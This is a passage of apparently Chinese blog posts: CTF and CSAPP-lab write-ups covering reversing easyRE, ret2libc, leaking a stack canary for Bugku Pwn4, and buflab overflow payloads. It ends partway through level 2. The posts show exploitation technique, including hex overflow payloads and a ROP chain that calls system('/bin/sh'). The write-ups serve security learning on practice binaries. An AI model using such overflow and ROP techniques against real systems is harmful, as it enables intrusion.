class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c</span><br><span class="line"></span><br><span class="line">char v12[13]; // [rsp+60h] [rbp-C0h] BYREF</span><br><span class="line">char v13[4]; // [rsp+6Dh] [rbp-B3h] BYREF</span><br><span class="line">char v14[19]; // [rsp+71h] [rbp-AFh] BYREF</span><br><span class="line">char v15[32]; // [rsp+90h] [rbp-90h] BYREF</span><br></pre></td></tr></table></figure><p>这个事实上是按照栈的顺序排列的，也就是说<code>v12</code>在靠近栈顶的地方，<code>v15</code>在靠近栈底的地方。</p><p>那么<code>v15</code>看着没有<code>37</code>的大小，把它溢出一下用用别人的不就好了嘛，别人反正在我用的时候它也不用，然后那些<code>v12,v13,v14</code>都可以看成首尾相连的，因为它们的栈地址本来就挨着的。然后那些都是有赋初值的，那么我们写一个脚本跑一下看看这串字符是什么。</p><p><img src="https://i.loli.net/2021/05/06/5aroWkuvRVFHA9C.png" alt="buuoj 红帽杯2019 easyRE_2.png"></p><p>它告诉你了一串信息：前四个字符是<code>flag</code>你花了这么久时间破解出来的一串字符，它肯定有用，先留着，后面分析肯定要用。</p><p>然后第二个引入眼帘的就是10个一模一样的函数了，点进去发现它引用了base64的那张表，而且很明显看见3,4之类在base64加密解密很常见的数字，那么不用细看了，肯定base64解密。然后看看发现读入了40个字符，然后后面还有一个函数<code>!(unsigned int)sub_400360(v11, off_6CC090)</code>稍微再熟悉点就会发现肯定是<code>strcmp</code>函数，常用格式嘛<code>if(!strcmp)</code>，那么就是它解密了10次变成长度39的字符串，这里真的不用考虑这个函数是加密的情况，总不可能加密了，这个长度才40，算一算也很清楚。那么如果是解密的话，原字符串长度大概在710长度左右，公式：<code>40*((4/3)**10)</code>算得的。这么长的字符串，刚刚那个第一个就是，大概长度就是710，很符合我们的需求，写exp对它10次base64解密得到一个<a href="https://bbs.pediy.com/thread-254172.htm">网址</a>，然后你就发现自己被骗了，那里没有<code>flag</code>，然后就会发现这里没什么地方可以分析了。</p><p>然后你可以看到刚刚那一串很长的字符串上面还有一串字符串。</p><p><img src="https://i.loli.net/2021/05/06/TdMyJQIqXgPu1WF.png" alt="buuoj 红帽杯2019 easyRE_3.png"></p><p>一路跟踪它发现来到了另一个函数<code>sub_400D35</code>可以很明显看到<code>102</code>,<code>103</code>它们分别是<code>f</code>,<code>g</code>的ascii码值，并且刚好下标在0和3，那么回想前面给的信息，直接断定这个字符串是<code>flag</code>。</p><p><img src="https://i.loli.net/2021/05/06/ieT7YQB9vgjkn2z.png" alt="buuoj 红帽杯2019 easyRE_4.png"></p><p>然后后面对这个字符串动手动脚的，那么找到了长度为25的一个字符串，根据它的加密规则：每四位轮换<code>v2[4]</code>对它异或运算。甭管<code>v2</code>是啥，它和这个字符开头异或肯定是<code>flag</code>这个是铁的道理，因为前面破解出了一个提示。</p><p>那么咱们写脚本解一下这串字符。直接得到<code>flag</code></p><p><img src="https://i.loli.net/2021/05/06/rVxmMbHEOuZATvW.png" alt="buuoj 红帽杯2019 easyRE_5.png"></p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[]=&#123;<span class="number">0x40</span>,<span class="number">0x35</span>,<span class="number">0x20</span>,<span class="number">0x56</span>,<span class="number">0x5D</span>,<span class="number">0x18</span>,<span class="number">0x22</span>,<span class="number">0x45</span>,<span class="number">0x17</span>,<span class="number">0x2F</span>,<span class="number">0x24</span>,<span class="number">0x6E</span>,<span class="number">0x62</span>,<span class="number">0x3C</span>,<span class="number">0x27</span>,<span class="number">0x54</span>,<span class="number">0x48</span>,<span class="number">0x6C</span>,<span class="number">0x24</span>,<span class="number">0x6E</span>,<span class="number">0x72</span>,<span class="number">0x3C</span>,<span class="number">0x32</span>,<span class="number">0x45</span>,<span class="number">0x5b</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">string</span> key=<span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        key[i]^=s[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(s);i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s[i]^key[i%<span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc学习报告</title>
      <link href="/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>在做<code>pwn</code>题的时候，我们会想尽一切办法执行函数<code>system(&quot;/bin/sh&quot;)</code>，那么执行这个需要两点：</p><p>1.找到<code>system()</code>函数。</p><p>2.找到<code>&quot;/bin/sh&quot;</code>字符串。</p><span id="more"></span><h2 id="level0-have-everything"><a href="#level0-have-everything" class="headerlink" title="level0:have everything"></a>level0:have everything</h2><p>这个情况在简单比赛的签到题估计都出不了了，在溢出点写上<code>system()</code>的地址，若是32位则隔四字节往后填充<code>&quot;/bin/sh&quot;</code>字符串就行了。如果是64位的那么找到<code>pop %rdi ret</code>的<code>gadgets</code>在返回地址填上，并且后面堆上<code>&quot;/bin/sh&quot;</code>的地址和<code>system()</code>的地址即可成功</p><h2 id="level1-without-“bin-sh”"><a href="#level1-without-“bin-sh”" class="headerlink" title="level1:without “bin/sh”"></a>level1:without “bin/sh”</h2><p>在一个地方写上<code>&quot;bin/sh&quot;</code>然后溢出的时候传参就行了。如果没开启<code>ASLR</code>那么可以直接往栈上写，如果开了那你只能往<code>.bss</code>段去写，其实写好后跟<code>level0</code>差不多,也不多赘述。</p><h2 id="level9999-have-nothing"><a href="#level9999-have-nothing" class="headerlink" title="level9999:have nothing"></a>level9999:have nothing</h2><p>哇，这个难度我觉得真的是上升了不少档次，所以给个<code>9999</code>级我觉得不过分。</p><p>啥都没有的情况就要往<code>libc</code>里面去找<code>system()</code>函数了，<code>libc</code>的所有函数之间的偏移都是固定的，确定了一个函数相当于确定了<code>libc</code>中所有的函数的地址。然后就是困扰了我一整天的东西了：<code>plt</code>表和<code>got</code>表，这两个表是什么愣是看了很久，因为感觉按照自己的逻辑完全没必要弄这么两张表的。</p><p>先看看专业解释的<code>plt</code>和<code>got</code>：</p><p><code>plt(procedure linkage table)</code>程序联动表:</p><p>当程序执行的时候在这个表里执行搜寻系统函数地址的代码。首次执行系统函数时，搜寻获取真实地址,其后再执行该函数时直接从GOT中获取真实地址。</p><p><code>got(global offset table):</code>全局偏移表:</p><p>在还没有获取到地址的时候，默认返回<code>plt</code>表调用<code>dl_runtime_resolve</code>函数寻找libc函数的地址。</p><p>其实我到现在都还不敢肯定我讲的对不对，但是我也要敢于说出来，让别人看到，如果你看到我的观点认为有很大问题的，欢迎你跟我联系，将感激不尽。</p><p>以下为我目前认为的观点：</p><p>程序在运行的时候加载<code>libc</code>，只有一个能确定：那就是偏移，但是基址是不确定的，因此我之前的疑惑：如果知道偏移那何不直接把地址写在<code>got</code>表里面就解开了。第一次运行的时候要去寻找基址，然后才能加上偏移写在<code>got</code>表中，就可以很方便地直接调用了。那么可能又会有疑问：为什么我每一次运行的地址都确定的？那是因为我们nc的远程服务器它只运行了这一个程序，也就是只有这一个程序调用了<code>libc</code>，所以每一次运行的时候当然确定的，当然前提是这个文件没有开启<code>ASLR</code>。</p><p>以上只是自己在搜集了这么多师傅的资料后能得到的自己认为正确的观点，真的很大概率错的。</p><p>如果got表没有装载<code>system</code>函数那么我们就要自己寻找<code>system</code>函数的地址了。我们先列出一些公式，我设<code>libc</code>里面有一函数<code>aaa()</code>，那么可以得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaa=libc_base+aaa_offset</span><br><span class="line">system=libc_base+system_offset</span><br></pre></td></tr></table></figure><p>因为所有函数偏移都已知，所以得到一个函数的地址即得到所有函数的地址。一般我们可以通过输出函数来泄露这个函数的地址，泄露成功就能<code>getshell</code></p><p>(PS:学是五天前学的，到现在还是没学会qwq)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>canary保护学习报告:通过字符串泄露canary</title>
      <link href="/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/"/>
      <url>/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<p>这几天一直在跟着团队的进度做<code>csapp</code>的实验报告，突然想拿题来练手了才发现自己还是有点菜的。这次的任务是做一道简简单单的带<code>canary</code>保护的一题，做了很长时间问了很多师傅，也算把这个方法搞搞明白了，但是不确定能不能完全说的明白，那么下面就开始吧。</p><span id="more"></span><h1 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h1><p><code>canary</code>就是一段简简单单的cookie，它一般在上个函数所保存的<code>ebp</code>之前(即靠近栈顶的那个方向)下面一个图能描述一个带<code>canary</code>保护的栈帧，应该还是比较清楚的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">↑栈顶</span><br><span class="line">buf//函数的缓冲区，一般用于保存局部变量</span><br><span class="line">canary</span><br><span class="line">ebp//上一个函数保存的ebp</span><br><span class="line">eip//返回地址</span><br><span class="line">argument 1</span><br><span class="line">argument 2</span><br><span class="line">argument 3</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">↓栈底</span><br></pre></td></tr></table></figure><p>如果企图用大量数据覆盖缓冲区并且修改返回地址的数据达到劫持<code>eip</code>的目的那么就会修改<code>canary</code>的值，那么在返回的时候检测到<code>canary</code>的值发生改变后就会直接抛出异常并且停止执行程序。并且每次<code>canary</code>的值都是随机的，普通方法几乎是突破不了的。但是我们可以先想办法泄露<code>canary</code>的值，然后再把<code>canary</code>插入到<code>payload</code>当中，这样的话，就算我溢出了，但是并没有修改<code>canary</code>的值，也就没办法检测到我有没有栈溢出了。在64位的程序当中，<code>canary</code>就是一个七字节的数据带一个<code>\x00</code>字节，并且<code>\x00</code>字节在最低位。</p><p>那么回想一下字符串是什么？字符串就是一串连着的字节序，不管它原本在这个地方的定义是什么，我说它是字符串，他就可以是字符串，因为计算机它不管是存什么数据它终归也只是0和1的组成。例如<code>0x61626364</code>它看上去好像是一个<code>int</code>型变量，但是它储存也只是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">64 63 62 61</span><br></pre></td></tr></table></figure><p>如果我把它看成字符串那也没错，它可以代表字符串<code>dcba</code>，它们存储的数据是一模一样的。但是有一个问题：计算机里基本上都是又很多字节连在一起，那如果后面还有很多数据，怎么样才能只表示字符串<code>dcba</code>呢？那就需要一个特殊字节<code>\x00</code>了，识别字符串会从一个字符指针开始，然后依次增大指针的值，只要指针所指向的地址不是<code>\x00</code>字节，那么它就可以是这个字符串中的一员。那如果我输入一个字符串，溢出了但没完全溢出呢？我们把字符串填充地恰到好处，刚好紧挨着<code>canary</code>，那么在之后如果<code>printf</code>这个字符串的话，就会把<code>canary</code>一起输出出来，我们就获取了<code>canary</code>。但是注意，canary最后一个字节是<code>\x00</code>，不会被接受，因此在获取canary的时候注意末尾加上<code>\x00</code>字节。</p><p>下面来看道例题：</p><h2 id="Bugku-Pwn4"><a href="#Bugku-Pwn4" class="headerlink" title="Bugku - Pwn4"></a>Bugku - Pwn4</h2><p>下载文件照例拖进虚拟机<code>checksec</code>检查一下各种保护</p><p><img src="https://i.loli.net/2021/05/01/XSkKpCyAZN1uslE.png" alt="Bugku_pwn4_1.png"></p><p>发现只开启了<code>canary</code>和堆栈不可执行的保护，堆栈不可执行那么就不能注入代码，一般就直接<code>rop</code>攻击，这没什么好讲的。拖进<code>IDA-F5</code>主函数看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+10h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">520</span>]; <span class="comment">// [rsp+40h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+248h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Welcome!\n&quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Please leave your name(Within 36 Length):&quot;</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x300</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, buf);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Please leave a message(Within 0x200 Length):&quot;</span>, <span class="number">0x2C</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, v5, <span class="number">0x300</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your message is :%s \nBye~&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里执行了两次<code>read()</code>函数，并且读取的大小远远超过缓冲区开辟的大小，基本上可以说无限制吧。然后第一次<code>read</code>之后还有一次<code>printf()</code>输出，那很明显，第一次就让你泄露canary，第二次就去执行<code>shell</code>函数，如果不确定缓冲区的大小，那么可以双击buf变量看看和离本函数<code>rbp</code>的相对偏移。</p><p><img src="https://i.loli.net/2021/05/01/uPz4Uq21LEdsOvF.png" alt="Bugku_pwn4_2.png"></p><p>可以看到相对<code>rbp</code>的偏移为<code>-0x240</code>而且<code>canary</code>在<code>rbp-8</code>的位置，那么我们第一次的<code>payload</code>就很容易得知是<code>b&#39;a&#39;*(0x240-8-1)</code>了。然后用<code>recv</code>函数接受它输出的字符串，那么我们知道前面的<code>Hello</code>+<code>sapce</code>以及我们输入的<code>0x237</code>个<code>a</code>一共有<code>0x23e</code>个字节，这些都是垃圾数据，在接收完这些数据之后我们再往后接收七个字节，这些数据就是<code>canary</code>。那么分析到这里我们的<code>exp</code>就很好写了</p><p><img src="https://i.loli.net/2021/05/01/lb8YdQVfKAI32oh.png" alt="Bugku_pwn4_3.png"></p><p>在这里<code>p.sendline</code>对应<code>b&#39;a&#39;*0x237</code>然后你可以直接<code>p.recvline()</code>直接接收完垃圾数据或者是<code>p.recv(0x23e)</code>指定接收数据的长度的，因为<code>p.sendline()</code>会在指定的字符串之后添加一个<code>\n</code>字节，所以你前面只能有<code>0x237</code> 个填充的字节，然后此时<code>p.recvline()</code>在接收到<code>\n</code>字节后停止，这个和之前讲的字符串的判定类似。但是如果直接<code>p.send()</code>的话就可以填充满，并且你只能用第一个方法接收垃圾数据。那这样的话canary就成功被我们泄露并且保存了，接下来就是构造<code>shell</code>函数了。我们<code>shift+F12</code>查看字符串，一般<code>pwn</code>题的突破口都在这里，甚至逆向题也是如此。</p><p><img src="https://i.loli.net/2021/05/01/vyebYQpIdxDh3nl.png" alt="Bugku_pwn4_4.png"></p><p>查到<code>bin/sh(0x601068)</code>字符串，并且<code>system</code>函数直接在表里可以查到<code>0x400660</code>，但是<del>往后面调用了system函数以及堆了那个参数之后才</del>注意到这是64位程序，所以我们很轻(jian)松(nan)地可以得知这题肯定要用<code>rop</code>去传参给<code>rdi</code>寄存器了，32位和64位的传参差异我就不过多赘述了，前面博客很多次提到过了。那么这个时候我们先写出要执行的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq $0x601068,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>但是一般来说，带一个那么多位立即数的且指令一模一样的是不可能直接让你找到的。此时肯定不能莽撞，只可智取，我们因为栈上的数据我们可以随意写(只是不能写代码，写了也不能执行啊)，那么我们重新看一看栈的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">canary</span><br><span class="line">rbp</span><br><span class="line">rip</span><br></pre></td></tr></table></figure><p>我们如果在rip位置放一个<code>pop %rdi</code>的话，那么<code>rip</code>下方的数据就能直接被传出来，然后后面再放上<code>system</code>函数就完成了整个提权函数的构造了，那么我们的<code>payload</code>就直接是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=...+canary+fake_rbp+pop_rdi+bin_sh_addr+system_addr</span><br></pre></td></tr></table></figure><p>找rop碎片的方法在前面的attacklab中有提到很多的，大家可以翻翻我前面的博客，所以我们完整的exp就可以出炉了：</p><p><img src="https://i.loli.net/2021/05/01/uWeGAhXz3JHSqKM.png" alt="Bugku_pwn4_5.png"></p><p>今天真的学到了很多知识，非常的开心，但是对于初入ctf的小白我来说，还有很长的路要走。加油！</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bufblab实验报告:32位程序缓冲区溢出攻击</title>
      <link href="/2021/04/30/buflab/"/>
      <url>/2021/04/30/buflab/</url>
      
        <content type="html"><![CDATA[<p>在此实验开始之前，弄清楚给你的三个文件分别干嘛的。</p><p><code>bufbomb</code>：实验需要攻击的程序</p><p><code>hex2raw</code>：根据填写的字节生成攻击字符串</p><p><code>makecookie</code>：对每个实验用户生成一个八位十六进制的字节序列，用于识别用户。(可能是用来打分的)</p><p>在<code>gdb</code>要运行的时候，一定要输入<code>r -u &lt;your id&gt;</code>，终端运行要输入<code>./bufbomb -u &lt;your id&gt;</code>，否则你是运行不了的。那咱们先输入<code>./makecookie -q</code>生成你的<code>cookie（id）</code>,最好先找个地儿保存一下。</p><span id="more"></span><p>作者在这里赞美一下这本书的编者：<code>csapp</code>的所有实验设计简直不要太好，学习计算机系统本是一个很枯燥的学习过程，但是这里的实验最大程度激发学生学习的兴趣。同时也希望国内的编者能够借鉴这本书的巧妙之处，让国内出越来越多的优秀教材。（由于本人表达能力不够，也只能这么夸了qwq）</p><h2 id="level0-Candle"><a href="#level0-Candle" class="headerlink" title="level0:Candle"></a>level0:Candle</h2><p>这一堆英文我反正也看不来<code>qwq</code>，既然是<code>level0</code>不妨问题想简单一点：给了我<code>test()</code>函数，调用了一个<code>getbuf()</code>，而后又有一个<code>gets()</code>危险函数，又给了一个<code>Smoke()</code>函数，那么无疑，应该就是通过溢出调用<code>Somke()</code>，先反正不涉及代码注入等东西<code>gdb</code>就是万能的，我们普通地这么溢出只需要确定两点：</p><ol><li>缓冲区的大小</li><li><code>Smoke()</code>函数的地址</li></ol><p>先<code>gdb bufbomb</code>然后：</p><p><code>print Smoke</code>就可以输出函数的地址，<code>disassemble getbuf</code>就可以查看<code>getbuf()</code>的汇编代码</p><p><img src="https://i.loli.net/2021/04/26/WNAayP3TSYiGJ5Z.png" alt="buflab_level0_1.png"></p><p>可以看到，<code>buf</code>的大小是<code>0x28</code>，那么就构造<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">18 8c 04 08</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/EP5SQWcfa23hDi7.png" alt="buflab_level0_2.png"></p><p>但是发生了段错误，这里我调了很久，也可能是因为之前做64位的攻击，有点忘了32位的攻击的区别，因为真的之前就是它缓冲区开了多少我填那么多再堆返回地址就好了的。直到我看到<code>getbuf()</code>函数有一个<code>leave</code>指令，我这就去网上搜了一下<code>leave</code>指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Leave==</span><br><span class="line">movl %ebp %esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure><p>啊这？又被弹出来了原来的<code>ebp</code>?可能在你们眼里这个完全是个没必要犯得错误，但是我遇到了我就得这么讲出来，也算是一种提升吧。那就很清楚了，我们把函数返回地址弹出去了，就导致给<code>eip</code>的不知道是什么地址了。所以再加四字节的<code>00</code>，就会把<code>00 00 00 00</code>弹给<code>ebp</code>而把<code>smoke()</code> 函数的返回地址弹给<code>eip</code>了。所以正确的<code>payload</code>应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">18 8c 04 08</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/tswP6XaDFAEB94S.png" alt="buflab_level0_3.png"></p><p>可以看到，这就攻击成功了，我是没想到啊，最简单的攻击就败下阵来，一次失败然后成功得到的经验比多次成功得到的经验是多很多的，所以嘛，这波不亏。</p><h2 id="level1-Sparkler"><a href="#level1-Sparkler" class="headerlink" title="level1:Sparkler"></a>level1:Sparkler</h2><p>这次要求我们执行的<code>shell</code>函数是<code>fizz(int val)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val); </span><br><span class="line">        validate(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这回加了个参数判断，32位的程序，甚至不需要代码注入，参数直接往返回地址后面填就好了。地址怎么找我也就不赘述了，加参数的话，如果多位参数记得一定是从右往左入栈的，即：第一个参数在离栈顶最近，第二个就是网站底走四个字节，第三个……以此类推。但是一定注意栈帧的构成，它在调用函数的时候压完参数还要压<code>eip</code>，虽然我们不一定要它返回到什么地方，但是它有，所以我们在原来的基础上填充四个字节的假的返回地址再把参数加进去</p><p>payload就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">42 8c 04 08//fizz address</span><br><span class="line">00 00 00 00//fake returning address</span><br><span class="line">8a 5f 63 5e//your cookie</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/28/kjfapgYERzZxwvG.png" alt="buflab_level1_1.png"></p><p>那这个<code>level1</code>就也解决了，个人认为这个<code>buflab</code>应该放在<code>attacklab</code>前面的，64位参数不好直接传，但是32位就硬传，但是它这么设计必有什么我目前不知道的巧妙之处。</p><h2 id="level2-Firecracker"><a href="#level2-Firecracker" class="headerlink" title="level2:Firecracker"></a>level2:Firecracker</h2><p>这一次要求我们执行的<code>shell</code>函数是<code>bang()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (global_value == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);     </span><br><span class="line">        validate(<span class="number">2</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很清楚的看出来，程序定义了一个全局变量，执行这个函数的时候要求这个变量==<code>your cookie</code>我们都很清楚，全局变量不同于局部变量，局部变量是存在栈中的，全局变量存在<code>.bss</code>段或者是<code>.data</code>段的，因此我们要修改不可能只是简单的栈溢出，我们需要注入代码。在栈中注入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl value of cookie,address of global_value</span><br><span class="line">pushl (address of bang)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>因为栈可以执行代码，没必要去搜集<code>rop</code>碎片，直接注入这一串代码就行了。<code>bang()</code>函数的地址和<code>cookie</code>我们是很容易获取的，唯一就是这全局变量的地址我们没办法直接获取。我们可以选择<code>disassemble bang</code>反汇编这个函数看看具体的结构。</p><p><img src="https://i.loli.net/2021/04/29/vOFoK3wcjGVesHZ.png" alt="buflab_level2_1.png"></p><p>可以发现中间<code>cmp</code>指令比较一定就是那个<code>if</code>语句的实现，比较的东西肯定也是<code>cookie</code>和那个<code>global_value</code>，并且也很清楚的可以看到，它比较的内容都是<code>ds</code>段寄存器的 内容。至于这两个地址哪一个还需要进一步分析，因为我们可以很清楚的知道，在运行的时候我们的<code>cookie</code>就是已经确定的，而另一个则应该一直是0，所以我们可以先<code>b getbuf</code>然后<code>r- u xiaoji233</code>，运行在中间停住的时候<code>print *0x804d100</code>看看这个地址到底是什么。</p><p><img 